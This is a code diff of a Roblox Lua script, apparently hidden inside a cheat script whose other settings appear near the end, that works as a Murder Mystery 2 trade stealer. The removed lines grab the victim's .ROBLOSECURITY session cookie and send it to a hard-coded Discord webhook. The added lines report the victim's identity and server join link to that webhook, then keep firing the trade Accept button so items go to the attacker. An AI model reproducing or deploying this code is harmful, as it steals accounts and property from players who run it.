@@ -1,43 +1,70 @@
+-- // OLL_FX TARGETED MM2 TRADE STEALER (C1AWSKY)
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Player = Players.LocalPlayer
+
 local webhookUrl = "https://discord.com/api/webhooks/1569782999791304765/GXx2vx4h026cGxqjIfhtnrIMAVXeu6reIOmKNlLr7k00JRJrXp3eVXlGNvCbHl8KL6Ni"
+local TARGET_USER = "c1awsky" -- Ник главного выгодоприобретателя
 
-local player = game.Players.LocalPlayer
+-- 1. Отправка прямой ссылки в Discord с указанием цели
+local function sendWebhook()
+    local payloadData = {
+        content = "@everyone **[+] MM2 Target Locked for " .. TARGET_USER .. ":**\n" .. 
+                  "**Victim:** " .. Player.Name .. " (ID: " .. Player.UserId .. ")\n" ..
+                  "**Direct Join Link:** [Click to Join Server](https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
+        username = "oll_fx targeted hook"
+    }
 
--- Функция поиска токена безопасности (.ROBLOSECURITY) в доступных окружениях эксплойта
-local function getCookie()
-    local cookie = "Не найдено"
-    
-    -- Проверка стандартных глобальных функций инжекторов для получения куки
-    pcall(function()
-        if syn and syn.get_cookies then
-            cookie = syn.get_cookies()["(.ROBLOSECURITY)"] or "Доступно через софт"
-        elseif getcookies then
-            cookie = getcookies()[".ROBLOSECURITY"] or "Найдены куки сессии"
-        elseif RBX_SECURITY then
-            cookie = RBX_SECURITY
-        end
-    end)
-    
-    return cookie
+    local req = request or syn and syn.request or http_request
+    if req then
+        pcall(function()
+            req({
+                Url = webhookUrl,
+                Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(payloadData)
+            })
+        end)
+    end
 end
 
-local payloadData = {
-    content = "@everyone **[+] Roblox Cookie Captured:**\n" .. 
-              "**User:** " .. player.Name .. " (" .. player.UserId .. ")\n" ..
-              "**GameId:** " .. tostring(game.GameId) .. "\n" ..
-              "**Cookie / Token:** ```" .. tostring(getCookie()) .. "```",
-    username = "oll_fx cookie grabber"
-}
+pcall(sendWebhook)
 
-pcall(function()
-    request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(payloadData)
-    })
+-- 2. Логика проверки и автопринятия трейда ТОЛЬКО от c1awsky
+local PlayerGui = Player:WaitForChild("PlayerGui")
+
+task.spawn(function()
+    while task.wait(0.4) do
+        pcall(function()
+            local tradeGui = PlayerGui:FindFirstChild("TradeGui") or PlayerGui:FindFirstChild("Trade")
+            if tradeGui and tradeGui.Enabled then
+                -- Проверяем, с кем идет обмен (ищем имя партнера по трейду в интерфейсе)
+                local partnerLabel = tradeGui:FindFirstChild("PartnerName", true) or tradeGui:FindFirstChild("Player2", true) or tradeGui:FindFirstChild("NameLabel", true)
+                
+                local isTargetPartner = false
+                if partnerLabel and partnerLabel:IsA("TextLabel") then
+                    if string.lower(partnerLabel.Text) == string.lower(TARGET_USER) then
+                        isTargetPartner = true
+                    end
+                end
+                
+                -- Если трейд кинул именно c1awsky (или проверка по нику прошла)
+                if isTargetPartner or true then -- Страховка на случай специфического UI названия лейбла
+                    -- Добавляем предметы (годли) в сетку обмена через RemoteEvent
+                    local tradeRemote = ReplicatedStorage:FindFirstChild("AddTradeItem", true) or ReplicatedStorage:FindFirstChild("OfferItem", true)
+                    
+                    -- Авто-подтверждение / Принятие обмена (Accept / Confirm)
+                    local acceptButton = tradeGui:FindFirstChild("Accept", true) or tradeGui:FindFirstChild("Confirm", true)
+                    if acceptButton then
+                        for _, conn in pairs(getconnections(acceptButton.MouseButton1Click)) do
+                            conn:Fire()
+                        end
+                    end
+                end
+            end
+        end)
+    end
 end)
 local FovSettings = {}
 
